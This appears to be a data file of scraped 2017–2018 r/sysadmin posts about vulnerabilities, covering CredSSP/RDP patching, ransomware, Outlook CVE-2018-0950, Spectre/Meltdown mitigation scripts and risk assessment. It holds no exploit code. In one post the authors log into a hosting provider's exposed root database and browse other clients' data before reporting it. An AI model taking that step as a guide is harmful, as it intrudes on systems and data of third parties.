Second of two posts today. This one is very important to understand as it could potentially impact the way that you access (or can't access) your systems via RDP. Yes yes, I know, you should use PowerShell or Windows Admin Center to manage your machines, but we know that you still like good ole RDP.. Without further ado! Article Link: URL &gt; # CredSSP, RDP and Raven &gt; Welcome to another addition of AskPFEPlat, this is Paul Bergson and [Graeme Bray](URL bringing up the topic of CredSSP when in use with the Remote Desktop Protocol. This topic became an internal discussion around Premier Field Engineering and customers like you as to how this would impact accessing systems via RDP starting in May. This discussion kind of aligns itself with an experience I recently had with my Miniature Schnauzer, Raven. You might be asking yourself what could Raven possibly have to do with IT maintenance? &gt; Being a Premier Field Engineer I end up traveling and my backpack is my carryon of choice when I board a plane, so I always carry some snacks in the event I get hungry. A couple of months back I returned from a trip presenting Protecting Against Ransomware to a customer and upon my return I left a half-eaten bag of candy in the side pocket of my backpack. This was just a regular size bag, but sugar isnt good for dogs. I kept telling myself, I should remove the bag, but I wanted to ensure I had something in the event of a candy emergency. So, my urge for sweets beat my common sense that Raven would ever find the half-eaten bag in my backpack. &gt; So, I get home late with my wife, a couple of nights ago and Raven races to the door to greet us, but she quickly decides to race around the house just to run. All I could think was what got into her??? As I entered the living room (she went zooming by) I see the candy wrapper from my backpack strewn all over the carpet. All I could do was think, that I knew better and wasnt happy with myself. &gt; Raven didnt get sick, but it was a lesson to me to follow my instincts and not put Raven in this situation. This could have easily been prevented but I just convinced myself, Dont worry, things will be fine when in fact I was aware of the risk and ignored it anyways! &gt; So, with that in mind, I wanted to call to your attention a Microsoft, May 2018 tentative update that could impact the ability to establish remote host RDP session connections within an organization. This issue can occur if the local client and the remote host have differing Encryption Oracle Remediation settings within the registry that define how to build an RDP session with CredSSP. The Encryption Oracle Remediation setting options are defined below and if the server or client have different expectations on the establishment of a secure RDP session the connection could be blocked. There is the possibility that the current default setting could change from the tentative update and therefore impact the expected secure session requirement. &gt; With the release of the March 2018 Security bulletin, there was a fix that specifically addressed a CredSSP, Remote Code Execution vulnerability (CVE-2018-0886) which could impact RDP connections. &gt; An attacker who successfully exploited this vulnerability could relay user credentials and use them to execute code on the target system. &gt; URL &gt; Besides both the client and server being patched, there is the requirement that a new Group Policy setting be applied to define the protection for the CredSSP configuration, currently the setting will default to Vulnerable. The recommendation is to define a group policy to set it to either Force updated clients or Mitigated on both client and server. &gt; If you review the options of the group policy settings, you will see that there are 3 states in which the registry setting can exist on the clients and servers. Engineers will also want to consider devices in an unpatched state as seen in the table at the end of this document. &gt; Note: Ensure that you update the Group Policy Central Store (Or if not using a Central Store, use a device with the patch applied when editing Group Policy) with the latest CredSSP.admx and CredSSP.adml.

489,vulnerability,sysadmin,"Alright guys and gals, lets hear it... Whats the most difficult project/implementation youve successfully completed",26,8hwqv1,https://www.reddit.com/r/sysadmin/comments/8hwqv1/alright_guys_and_gals_lets_hear_it_whats_the_most/,2018-05-08 23:38:45,"I started in my current position 5 years ago at a non-profit, who, at the time, were outsourcing ~100k a year to a local MSP. I actually apologize in advance, because at first I didnt have an answer to this question myself, because i feel very inferior to the nix/enterprise admins that hang around here( you guys are badass) But... The hardest thing Ive done, is in-source everything, and created an environment that runs itself, can be managed (securely) from anywhere, on my phone. Ive also spent 50% of my time focusing on future-proofing the org for the next 5 years at least. TL:DR(and I mean this got really fucking long) got hired for desktop support, grew into the role of Director of IT. The only operational costs remaining are our Offsite backups , Sip trunks, and ISP services. Our annual spend on Managed services, is now under 3k Annualy. Yeah, I may seem like an idiot because you know Im still not compensated appropriately due to non-profit standards, but holy shit, this free-reign will be the best work experience I could ever ask for. It took a few years of 60-70 hour work weeks, but I got rid of the day to day headaches/Desktop support calls, spent tons of time tuning our servers, . (No budget? Shitty computers? Say hello to RDP). When I started-  there was no plan or knowledge of the fact that XP was going EOL within the next fiscal year. Very alarming.  You guessed it. Access databases. *Access databases everywhere* . Developed by the guy who I was replacing, who was grandfathered into the role because he knew a bit more compared to others  15 locations, half Verizon DSL, half Comcast, ALL RESIDENTIAL ACCOUNTS, in our participants names. All satellite offices used @comcast/Verizon e-mail addresses (even though we had exchange with fantastic licensing) . Great, you saved a few bucks... but there was more than one scenario where canceling the existing residential services was nearly impossible, because the client tied to the account was deceased. 6 months of pain, and I replaced all of our group home PCs with thin clients, and upgraded(I know, I know..) to Comcast business across the Org. Only service interruptions occur when a modem has been online for 70+ days, reboot, boom, back to normal.  Participant attendance = billing. Attendance was done on paper for each individual, each individual had several services at different billable rates . The billing expert, would create a gigantic spreadsheet and manually enter the data, which was faxed by all satellite offices employees all over. I ignored this because I frankly knew nothing about the case management/billing of our services. Well, soon enough, I finally got roped into a database upgrade project. That was great, we vetted many different solutions. Came to a unanimous decision about what we would end up using. Implementation takes a year. Two senior level managers met a project manager at a conference they went to . I sit in there an offer to help as much as possible but realistically, the database, websserver, DNS , user accounts/permissions schemes/security roles, etc. Everyone hates it. In fact, two senior staff level members were on the implementation team(mind you, I barely understood the requirements..), they decided they would leave, and not to long afterwards, the last member of the team left for a job elsewhere, and kept all of the billing knowledge to herself so she could charge us a consulting fee. A month worth of 70 hour work weeks, and that bitch is gone. I learned everything Ive ever needed to know about case management and state billing, and assumed the role of creating documentation for every function available. Billing is now automated and the quality of service and billing process is streamlined.  had a Nortel phone system that was connected to our $800/month t1 line, yup, I said it. Well that died. Replaced with ipoffice and avaya handsets. Ditched about 100 unused DIDs, and the t1 line. Great savings. Currently have two sites configured with remote VoIP handsets, running pretty smooth. no ticketing system. Implemented Jira. (Free for non profits)  no internal communication programs. Deployed slack. (Free for non profits.) Looking to move to teams in the future.  Backup/disaster recovery/business continuity - switched from Datto to Veaam cloud connect at $15 per server. Our MSP kept 3 months of data. It wasnt till I stared vetting other solutions that I found out that datto is supposed to provide unlimited retention(fuck those guys). $8k a year for Datto, $2100 for Veaam(including an investment on a beefy synology rack station) no money for new desktops. Scoured my entire state and found some of the most reliable refurb vendors around. They are now Friendors(as I like to call them) great deals, and honestly, getting 2nd/1st gen Intel machines that were 3-5 years old, turned out to be a great decision. They are all still running today. Ive deployed over 200 machines, and 5% of our workload is related to hardware issues. Oh also!! Found out about state surplus property program, where you can procure equipment from numerous state departments during their asset refresh cycles, example- just got 24 optiplex 790s for $20 a piece.  3 toshiba MFPs at HQ, each would jam upwards of 5 times a day. Replaced with xerox MFPS and HP pagewides at the satellite offices two years ago. Havent Had to unjam a copier once.  no inventory management solution. Things just went missing. Deployed lansweeper, problem solved.  firewall was a sonic wall tz210, with no bells and whistles. Replaced with sophos UTM. Using 95% of functionality, and loving it. Working on deploying Site to site REDs for full control. email/smarthost/spam filtering, we had appriver. I liked it, but found spamhero( dirt cheap), which worked pretty well. Turned on SMTP protection on the UTM, presto, things are great now. Migrated all 3 of our websites to dream host, (free hosting for non-profits)  created a few extra term servs, decommissioning a server 2003 in the process.  deployed PRTG, but wanted the RHEL experience, so Ive recently began implementing zabbix(absolute nightmare if you ask me, I know Nagios is even more difficult, from what I heard.) antivirus- deployed avast for EDU(say what yoh will, it works very well for us.). Not one single infection in 5 years, on any machine.  built a secondary DC.  Bought ScreenConnect licensing before connecrwise bought it. Got Grandfathered in to excellent pricing for their cloud based version. WSUS- yeah, real fun. But its set up and running  Deployed Nessus for vulnerability scanning/compliance. (Free for non profits.)  Created BYOD policy and standards.  Created documentation for all systems/software on confluence.( free for non profits)  deployed extremely feature-rich performance management add-on available for free from atlassian marketplace. (UpRaise)  deployed confluence.  developed an IT orientation that is run monthly for new hires.  configured hybrid exchange online/o365 to on-prem, for when were ready to move to The cloud. moved our website from concrete5 to Wordpress.  set up google analytics, AdWords, and all that other junk for all of our websites(Free for non profits) Im sure I left some shit out. But I actually just updated my resume. What are you excited about? "

There's been a significant rise in phishing scams targeting law firms, and ours are not excluded. Most of our firms run a Practice/Document Management System that runs on a Windows Server (C++/.Net/MSSQL) host. But there is two firms that run Lexis Affinity which is hosted on a RedHat Linux host with Oracle database. The discussion has arisen around the security comparisons of these two systems and specifically how vulnerable each one is in the event of a ransomware virus infection coming from one of the users computers. The biggest vulnerability of the Lexis Affinity system is that it requires users to have a network share mapped so the files (mainly documents) which are referenced in database can be opened. Moreover, the files are stored as the actual file type with the normal extension (eg. ""letter to client.doc""). The other system doesn't require any network shares, in fact, the only shares on the host server are for automatic client software updates (an executable or two). The word documents referenced in the database are stored on the server in parts (eg. 54321#6) with no file extension and are compiled into the document when opened. The .docx file is loaded into a temp files location while in use. From what I can see when I delve into the storage location, only the .pdf files are stored as actual files. My questions are: * Do the various ransomwares only target files with certain extensions or of a certain type? Are the part files of the SQL system unaffected if they could be accessed? * Does ransomware encrypt data on network shares that are only accessible with the the right authentication? (This includes C$/D$) * Related to the above question, if a server has no shares but high level authentication credentials are ""remembered"" in Windows by a previous connection, is the server vulnerable? * Does any ransomware target database systems? Either the database files themselves, or using connection strings? Thanks in advance"

The Microsoft Outlook vulnerability (CVE-2018-0950) could allow attackers to steal sensitive information, including users' Windows login credentials, just by convincing victims to preview an email with Microsoft Outlook, without requiring any additional user interaction."" URL ""The vulnerability, discovered by Will Dormann of the CERT Coordination Center (CERT/CC), resides in the way Microsoft Outlook renders remotely-hosted OLE content when an RTF (Rich Text Format) email message is previewed and automatically initiates SMB connections. A remote attacker can exploit this vulnerability by sending an RTF email to a target victim, containing a remotely-hosted image file (OLE object), loading from the attacker-controlled SMB server. Since Microsoft Outlook automatically renders OLE content, it will initiate an automatic authentication with the attacker's controlled remote server over SMB protocol using single sign-on (SSO), handing over the victim's username and NTLMv2 hashed version of the password, potentially allowing the attacker to gain access to the victim's system.""

520,vulnerability,sysadmin,DTLS v1.0 Security in VPN Connections - Actually secure?,3,80775o,https://www.reddit.com/r/sysadmin/comments/80775o/dtls_v10_security_in_vpn_connections_actually/,2018-02-26 07:29:11,"I've been doing quite a bit of research on DTLS lately as Cisco implements DTLS v1.0 (Based on TLS v1.1) in the ASA/AnyConnect platform for VPN connectivity. I have searched long far and wide and still don't have a clear answer... so I thought I'd reach out and pose the question :). Unfortunately, Cisco doesn't support DTLS v1.2 ... (even though you can force the ASA to TLS 1.2) For those unfamiliar, when DTLS is enabled, the client sets up a standard TLS 1.2 connection (using supported ciphers of your choice... e.g. EDH+AESGCM with PFS) and then negotiates the DTLS v1.0 connection as a data channel. (The use of UDP/DTLS definitely speeds up throughput on high latency links.) DTLS v1.0 doesn't do TLS v1.2+ ciphers - at least on the Cisco implementation you're stuck with AES256-CBC + SHA1 (gag). There has been at least [one published vulnerability](URL on DTLS v1.0 using CBC ciphers. However, I am nowhere near an expert on math at all. It's really unclear to me if this would affect something like AnyConnect. Tl;dr: Is DTLS v1.0 (using AES256CBC-SHA1) negotiated in a TLS 1.2 connection as implemented by Cisco ASA/AnyConnect (or anybody else) actually secure - is the use of the crappy AES256-SHA1 cipher for the DTLS mitigated somehow by the parent TLSv1.2 connection? If the ""control"" TLS 1.2 connection uses a PFS-enabled cipher, does that also mean that the negotiated DTLS connection is essentially protected with PFS? Credit to the Wikipedia article on DTLS :) (FWIW, I asked the same question over in /r/netsec but not sure if people will see it because it's a bit buried in the discussion thread)"

530,vulnerability,sysadmin,How we discovered a database leak in one of the biggest Swiss hosting provider,2,8442dd,https://www.reddit.com/r/sysadmin/comments/8442dd/how_we_discovered_a_database_leak_in_one_of_the/,2018-03-14 00:17:55,"During the development of our new security SaaS, allowing anyone to check the security level of its own servers, we ran tests on one of our own corporate websites. Since the website is hosted by one of the biggest hosting provider in Switzerland, we didnt expect to find any critical vulnerabilities. It turned out we were wrong. The concept of this new service, called Security Guardian, is to provide people with a quick and straightforward way to check if their servers are vulnerable. You can just let him scan your servers daily and be alerted if a vulnerability is found. During our testing routine of the early versions of the product, we made him monitor the security of one of our websites hosted externally by one of the biggest swiss hosting provider to see how it performs on a prolonged period. The first results were quite good, no critical vulnerabilities were found. We were satisfied by those results and let it run while we kept working on other things. After some quiet days, we received an e-mail from Security Guardian telling us that a critical vulnerability had been found on the web server that we were monitoring. At first, we were sceptical. The vulnerability was about the MySQL database having a weak password. The severity was high (9/10) so we quickly began investigating the problem. Security Guardian provides a daily report with easy to use information about the vulnerabilities. That day, the report was saying that it was possible to log into the database remotely with the root account without any password, which was odd, knowing we were dealing with a major hosting provider in Switzerland. Since the product was still in an early stage, we initially thought that it was probably a bug with our product. As the curious people we are, we decided to try to log into the database manually to see if the vulnerability was real. Well, as a matter of fact, that was not a bug in our product, we could really log into the database without any password from a conventional SQL client. From here, we had access to all the databases present on that server, including those of hundreds of their clients also hosting their websites on the same server. Hopefully, we had only read access and could not write or delete anything. Still, it was a critical security problem for their clients, including us. We contacted them within an hour and they reacted quickly. Shortly after, they began investigating the problem and fixed the vulnerability. Sadly, they did not give us more explanation on how it happened and how a root account was suddenly accessible without a password. All they told us was that they didnt know how or why this user was there. Since we were already connected, we took a quick look to see who was accessing the database besides us. We found out that we were not alone in there, some people from China were having a look as well as we found one of their IP address. Once they fixed the problem, Security Guardian confirmed that the vulnerability was gone. However, one week after the event, we received a new alert from Security Guardian notifying us that the vulnerability was back. We quickly checked again manually and contacted the hosting provider to warn them. Sadly, their reaction was not the most professional one. They wrote us back that the vulnerability was fixed again but they ignored our interrogations about the impact of the recurring problem. Then, they blocked the IP address of our scanner so we could not scan their server anymore. Finally, the moral of the story is that, even if you do not manage the server yourself, you should still care for its security and not trust blindly your hosting provider. Hard to say how long the hosting provider would have let this vulnerability wide open without our tool. This kind of things can happen to anyone, it is an example of why it is important to monitor the security of your servers continuously. The security of an asset is evolving with time and it is essential to be aware of the changes. "

Whether you like it or not, if you work in security, you are in the risk management business. To get started with IT security risk assessment, you need to answer three important questions: 1. What are your organizations critical information technology assets  that is, the data whose exposure would have a major impact on your business operations? 2. What are the top five business processes that utilize or require this information? 3. What threats could affect the ability of those business functions to operate? Once you know what you need to protect, you can begin developing strategies. However, before you spend a dollar of your budget or an hour of your time implementing a solution to reduce risk, you should be able to answer the following questions: 1. What is the risk you are reducing? 2. Is it the highest priority security risk? 3. Are you reducing it in the most cost-effective way? These questions get to the heart of the problem  that it is all about risk. # What is Risk? Risk is a business concept  is the likelihood of financial loss for the organization high, medium, low or zero? Three factors play into risk determination: what the threat is, how vulnerable the system is, and the importance of the asset that could be damaged or made unavailable. Thus, risk can be defined as follows: **Risk = Threat x Vulnerability x Asset** Although risk is represented here as a mathematical formula, it is not about numbers; it is a logical construct. For example, suppose you want to assess the risk associated with the threat of hackers compromising a particular system. If your network is very vulnerable (perhaps because you have no firewall and no antivirus solution), and the asset is critical, your risk is high. However, if you have good perimeter defenses and your vulnerability is low, and even though the asset is still critical, your risk will be medium. There are two special cases to keep in mind: * *Anything times zero is zero. If any of the factors is zero, even if the other factors are high or critical, your risk is zero.* * *Risk implies uncertainty. If something is guaranteed to happen, it is not a risk.* Here are some common ways you can suffer financial damage: * **Data loss.** Theft of trade secrets could cause you to lose business to your competitors. Theft of customer information could result in loss of trust and customer attrition. * **System or application downtime.** If a system fails to perform its primary function, customers may be unable to place orders, employees may be unable to do their jobs or communicate, and so on. * **Legal consequences.** If somebody steals data from one of your databases, even if that data is not particularly valuable, you can incur fines and other legal costs because you failed to comply with the data protection security requirements of HIPAA, PCI DSS or other compliance Now lets walk through the risk assessment procedure. # Step 1: Identify and Prioritize Assets Assets include servers, client contact information, sensitive partner documents, trade secrets and so on. Remember, what you as a technician think is valuable might not be what is actually most valuable for the business. Therefore, you need to work with business users and management to create a list of all valuable assets. For each asset, gather the following information, as applicable: * Software * Hardware * Data * Interfaces * Users * Support personnel * Mission or purpose * Criticality * Functional requirements * IT Security policies * IT Security architecture * Network topology * Information storage protection * Information flow * Technical security controls * Physical security environment * Environmental security Because most organizations have a limited budget for risk assessment, you will likely have to limit the scope of the project to mission-critical assets. Accordingly, you need to define a standard for determining the importance of each asset. Common criteria include the assets monetary value, legal standing and importance to the organization. Once the standard has been approved by management and formally incorporated into the risk assessment security policy, use it to classify each asset you identified as critical, major or minor. # Step 2: Identify Threats A threat is anything that could exploit a vulnerability to breach security and cause harm to your organization. While hackers and malware probably leap to mind, there are many other types of threats: * **Natural disasters.** Floods, hurricanes, earthquakes, fire and other natural disasters can destroy much more than a hacker. You can lose not only data, but the servers and appliances as well. When deciding where to house your servers, think about the chances of a natural disaster. For instance, dont put your server room on the first floor if your area has a high risk of floods. * **System failure.** The likelihood of system failure depends on the quality of your computer For relatively new, high-quality equipment, the chance of system failure is low. But if the equipment is old or from a no-name vendor, the chance of failure is much higher. Therefore, its wise to buy high-quality equipment, or at least equipment with good support. * **Accidental human interference.** This threat is always high, no matter what business you are in. Anyone can make mistakes such as accidentally deleting important files, clicking on malware links, or accidentally physical damaging a piece of equipment. Therefore, you should regularly back up your data, including system settings, ACLs and other configuration information, and carefully track all changes to critical systems. * **Malicious humans.** There are three types of malicious behavior: **Interference** is when somebody causes damage to your business by deleting data, engineering a distributed denial of service (DDOS) against your website, physically stealing a computer or server, and so on. **Interception** is classic hacking, where they steal your data. **Impersonation** is misuse of someone elses credentials, which are often acquired through social engineering attacks or brute-force attacks, or purchased on the dark web. # Step 3: Identify Vulnerabilities Third, we need to spot vulnerabilities. A vulnerability is a weakness that a threat can exploit to breach security and harm your organization. Vulnerabilities can be identified through vulnerability analysis, audit reports, the NIST vulnerability database, vendor data, commercial computer incident response teams, and system software security analysis. Testing the IT system is also an important tool in identifying vulnerabilities. Testing can include the following: * Information Security test and evaluation (ST&amp;E) procedures * Penetration testing techniques * Automated vulnerability scanning tools You can reduce your software-based vulnerabilities with proper patch management. But dont forget about physical vulnerabilities. For example, moving your server room to the second floor of the building will greatly reduce your vulnerability to flooding. # Step 4: Analyze Controls Analyze the controls that are either in place or in the planning stage to minimize or eliminate the probability that a threat will exploit vulnerability in the system. Controls can be implemented through technical means, such as computer hardware or software, encryption, intrusion detection mechanisms, and identification and authentication subsystems. Nontechnical controls include security policies, administrative actions, and physical and environmental mechanisms. Both technical and nontechnical controls can further be classified as preventive or detective controls. As the name implies, preventive controls attempt to anticipate and stop attacks. Examples of preventive technical controls are encryption and authentication devices. Detective controls are used to discover attacks or events through such means as audit trails and intrusion detection systems. # Step 5: Determine the Likelihood of an Incident Assess the probability that a vulnerability might actually be exploited, taking into account the type of vulnerability, the capability and motivation of the threat source, and the existence and effectiveness of your controls. Rather than a numerical score, many organizations use the categories high, medium and low to assess the likelihood of an attack or other adverse event. # Step 6: Assess the Impact a Threat Could Have Impact analysis should include the following factors: * The mission of the system, including the processes implemented by the system * The criticality of the system, determined by its value and the value of the data to the organization * The sensitivity of the system and its data The information required to conduct an impact analysis can be obtained from existing organizational documentation, including a business impact analysis (BIA) (or mission impact analysis report, as it is sometimes called). This document uses either quantitative or qualitative means to determine the impact that would be caused by compromise or harm to the organizations information assets. An attack or adverse event can result in compromise or loss of information system confidentiality, integrity and availability. As with the likelihood determination, the impact on the system can be qualitatively assessed as high, medium or low. The following additional items should be included in the impact analysis: * The estimated frequency of the threats exploitation of a vulnerability on an annual basis * The approximate cost of each of these occurrences * A weight factor based on the relative impact of a specific threat exploiting a specific vulnerability # Step 7: Prioritize the Information Security Risks For each threat/vulnerability pair, determine the level of risk to the IT system, based on the following: * The likelihood that the threat will exploit the vulnerability * The impact of the threat successfully exploiting the vulnerability * The adequacy of the existing or planned information system security controls for eliminating or reducing the risk A useful tool for estimating risk in this manner is the risk-level matrix. A high likelihood that the threat will occur is given a value of 1.0; a medium likelihood is assigned a value of 0.5; and a low likelihood of occurrence is given a rating of 0.1. Similarly, a high impact level is assigned a value of 100, a medium impact level 50, and a low impact level 10. Risk is calculated by multiplying the threat likelihood value by the impact value, and the risks are categorized as high, medium or low based on the result. # Step 8: Recommend Controls Using the risk level as a basis, determine the actions that senior management and other responsible individuals must take to mitigate the risk. Here are some general guidelines for each level of risk: * **High** A plan for corrective measures should be developed as soon as possible. * **Medium**  A plan for corrective measures should be developed within a reasonable period of time. * **Low**  The team must decide whether to accept the risk or implement corrective actions. As you consider controls to mitigate each risk, be sure to consider: * Organizational policies * Cost-benefit analysis * Operational impact * Feasibility * Applicable regulations * The overall effectiveness of the recommended controls * Safety and reliability #Step 9: Document the Results The final step in the risk assessment process is to develop a risk assessment report to support management in making appropriate decisions on budget, policies, procedures and so on. For each threat, the report should describe the corresponding vulnerabilities, the assets at risk, the impact to your IT infrastructure, the likelihood of occurrence and the control recommendations. Here is a very simple example: URL You can use your risk assessment report to identify key remediation steps that will reduce multiple risks. For example, ensuring backups are taken regularly and stored offsite will mitigate the risk of accidental file deletion and also the risk from flooding. Each of these steps should have the associated cost and should deliver real benefit in reducing the risks. Remember to focus on the business reasons for each improvement implementation. As you work through this process, you will get a better idea of how the company and its infrastructure operates and how it can operate better. Then you can create risk assessment policy that defines what the organization must do periodically (annually in many cases), how risk is to be addressed and mitigated (for example, a minimum acceptable vulnerability window), and how the organization must carry out subsequent enterprise risk assessments for its IT infrastructure components and other assets. Always keep in mind that the information security risk assessment and enterprise risk management processes are the heart of the cybersecurity. These are the processes that establish the rules and guidelines of the entire informational security management, providing answers to what threats and vulnerabilities can cause financial harm to our business and how they should be mitigated.

Dell's guidance at the time was that they were working on new firmware, but if you had already updated, to leave it as is. Dell is now recommending that if you've updated the BIOS firmware which contains the Spectre fix, that you **revert** back to an older firmware that didn't contain the fix, and to wait for new firmware updates. &gt; Dell is advising that all customers should not deploy the BIOS update for the Spectre (Variant 2) vulnerability at this time. We have removed the impacted BIOS updates from our support pages and are working with Intel on a new BIOS update that will include new microcode from Intel. &gt; If you have already deployed the BIOS update, in order to avoid unpredictable system behavior, you can revert back to a previous BIOS version.

552,vulnerability,sysadmin,Had a vulnerability assessment with Nessus and it found hundreds of missing critical Windows OS updates from as far back as 2016 - is this even right?,22,7lfglt,https://www.reddit.com/r/sysadmin/comments/7lfglt/had_a_vulnerability_assessment_with_nessus_and_it/,2017-12-22 16:41:39,"I work for a financial institution and I've been in IT for only like a 1.5 years, so I'm still learning this stuff. We have regular IT audits and such and now that I'm the only IT guy, I got to sit with the auditor and helped him fully scan our environment with Nessus. Results came back for around 150 systems and there was something like 500 vulnerabilities, 80% of which were missing critical Windows OS patches. &amp;nbsp; I was pretty shocked because I **always** stay on top of monthly Windows updates. The auditor says, ""well, it says there's some here from as far back as August of 2016"" in a condescending tone. I was pretty pissed but just accepted it and let him finish the scan and then I got the full assessment a few weeks later, which I'm now combing through. &amp;nbsp; So, first of all, I'm wondering.... don't Windows OS updates supersede past updates? --- meaning, if I miss some critical Windows OS updates for a month or two, but then I get all the critical updates for the following months *all the way* up until current time, then those newer updates take the place of those missing updates, meaning I no longer have to worry about those missed patches, correct? I assume the only thing Nessus is seeing is that those individual KB's are not listed in the Windows registry, and therefore flags them as not installed, despite the fact that it doesn't matter since all updates after those have been faithfully updated. &amp;nbsp; Other than that, I was thinking, we currently don't use WSUS because when I came on my job here, they had a 3rd party patch and software management tool called DesktopCentral by ManageEngine. That's how I do updates now, and I can view all the missing updates for every system and all I see are the missing updates for this month and a few for last month (machines that were turned off for weeks). &amp;nbsp; Additionally, we used to have Kaspersky 8 AV installed which was so unbelievably fucked up... I think it was even managing our Windows updates at one time. Then when I ripped it out of our environment, I had to use their special uninstall tool in safe mode.. so God knows how that messed things up. Some of my servers and computers that used to have Kav can't even run Windows update themselves. &amp;nbsp; Anyway, I'm hoping someone here has had a similar thing happen so you can maybe give some advice... otherwise, I'll just be knee-deep in manually patching super old updates."

562,vulnerability,sysadmin,LabTech Reporting and Scripting Process for Meltdown/Spectre,22,7ol3zd,https://www.reddit.com/r/sysadmin/comments/7ol3zd/labtech_reporting_and_scripting_process_for/,2018-01-07 05:57:29,"Thought I would post what I've built for getting some information about the current status of machines in LabTech with respect to the Meltdown/Spectre issues. In the Meltdown_Spectre LabTech Process.zip there are three folders. Here are their contents and what each does. YMMV on these as they are something I had to put together in one night, but they're helping us build reports on the current attack surface. Please note that this process is **for Windows only**. This process uses the SpeculationControl module, but I've edited it only to add a -Quiet switch. I just wrapped all of the Write-Host lines like this: If(!$Quiet) { Write-Host ""..."" } The parameter init looks like this: param ( [switch]$Quiet ) Feel free to use the module however you'd like. /SpeculationControl/SpeculationControl.psd1 &amp; /SpeculationControl/SpeculationControl.psm1 - These files comprise the PowerShell module for gathering vulnerability data. They both need to be copied to the following location in your LabTech Share: /LabTech/Transfer/Scripts/SpeculationControl Ref: [PSGallery](URL &amp;nbsp; /EDFs/Meltdown\_Spectre\_EDF.sql - This is the SQL file to import the EDFs that will be populated by the ""Meltdown_Spectre - Set EDF Vulnerability Status"" script. These are the datapoints that you'll want to run some SQL reporting on. The EDFs that will be added are on the Computer level, and are mostly just the return variables from the SpeculationControl module. * BTI Mitigation Hardware Present * BTI Windows Support Present * BTI Windows Support Enabled * BTI Disabled By System Policy * BTI Disabled By No Hardware Support * KVA Shadow Required * KVA Shadow Windows Support Present * KVA Shadow Windows Support Enabled * KVA Shadow Pcid Enabled There are two other EDFs that are separate checks: *RegKey Set for 2018-01* This EDF is for checking to see if the registry key is set to allow the 2018-01 updates to push. *2018-01 Patch Installed* This EDF is for checking if LabTech sees the 2018-01 update as installed on the target system. &amp;nbsp; /Scripts/Meltdown_Spectre - Enable Hyper-V Mitigations for VMs.xml - This script simply runs a reg add shell command on a target machine as long as the following stipulations are set. Ref: [KB4072698 Help](URL * Target machine is a Server OS older than 2016. * Target machine is a Hyper-V Server. Reg add command: reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Virtualization"" /v MinVmVersionForCpuBasedMitigations /t REG_SZ /d ""1.0"" /f &amp;nbsp; /Scripts/Meltdown_Spectre - Enable Local Mitigations.xml - This runs another 2 reg add commands against any Windows Server OS. The mitigations will not be enabled on a Server OS unless this is run on them. **Installing the 2018-01 update is not enough.** Ref: [KB4072698 Help](URL Reg add commands: reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverride /t REG_DWORD /d 0 /f &amp;nbsp; reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f &amp;nbsp; /Scripts/Meltdown_Spectre - Set Allow Reg Key for Update.xml - Yet another reg key entry. This one enables the 2018-01 update to be installed. AV providers should be adding this key automatically as they confirm support for the update. **Before running this script on any machine use the following table to confirm compatibility with your AV provider!!!** [Kevin Beaumont's Spreadsheet](URL Ref: [KB4056897](URL Reg add command: reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\QualityCompat"" /v cadca5fe-87d3-4b96-b7fb-a231484277cc /t REG_DWORD /d 0 /f &amp;nbsp; /Scripts/Meltdown_Spectre - Set EDF Vulnerability Status - This is the information gathering script that will be setting all of the EDFs from above. It will perform the following functions on the target machine in order: 1. Attempt to create a C:\Temp folder *(Line 1)* 2. Attempt to create a C:\Temp\SpeculationControl folder. *(Line 2)* 3. Copy the PowerShell module down to the target machine. *(Lines 4-5)* 4. Execute a PowerShell script that calls the SpeculationControl module and outputs the results to text files. (see below for code) *(Line 7)* 5. Runs through each text file and sets the EDF of the target machine based on the results. *(Lines 9-79)* 6. Checks for the ""2018-01 update allowed"" reg key. *(Lines 81-86)* 7. Checks for installation of 2018-01 patch. This is incomplete as the patch manager does not currently have all of the patch information for all OS versions in the database. New entries can be added later. *(Lines 88-100)* Script block: Import-Module -Name C:\Temp\SpeculationControl\SpeculationControl.psm1 $settings = Get-SpeculationControlSettings -Quiet $settings.BTIHardwarePresent | Out-File C:\Temp\SpeculationControl\BTIHardwarePresent.txt $settings.BTIWindowsSupportPresent | Out-File C:\Temp\SpeculationControl\BTIWindowsSupportPresent.txt $settings.BTIWindowsSupportEnabled | Out-File C:\Temp\SpeculationControl\BTIWindowsSupportEnabled.txt $settings.BTIDisabledBySystemPolicy | Out-File C:\Temp\SpeculationControl\BTIDisabledBySystemPolicy.txt $settings.BTIDisabledByNoHardwareSupport | Out-File C:\Temp\SpeculationControl\BTIDisabledByNoHardwareSupport.txt $settings.KVAShadowRequired | Out-File C:\Temp\SpeculationControl\KVAShadowRequired.txt $settings.KVAShadowWindowsSupportPresent | Out-File C:\Temp\SpeculationControl\KVAShadowWindowsSupportPresent.txt $settings.KVAShadowWindowsSupportEnabled | Out-File C:\Temp\SpeculationControl\KVAShadowWindowsSupportEnabled.txt $settings.KVAShadowPcidEnabled | Out-File C:\Temp\SpeculationControl\KVAShadowPcidEnabled.txt &amp;nbsp; Link - Before embarking on implementing this, please be aware that you should be highly technical and Expert level in LabTech and PowerShell scripting and reporting. **Do not just think this is a quick report you can run!** You must have an intimate understanding of how LabTech works, and be ready to run MySQL queries to gather this data. If you feel any hesitation on implementing this, you probably shouldn't. If you want to crack open the files and see what I've done, then you're probably good to implement this. We are currently on LabTech 11, so keep that in mind as well. This may not cleanly import, as we all know that nothing on the back-end is easy in LabTech. ;) I hope that this can help some MSP brothers and sisters out there that are likely getting bombarded with questions on what to do next because the mainstream media whipped them up into a frenzy. This is not optimized. This is not supported by me or my company. God speed. [OneDrive Shared Link](URL"

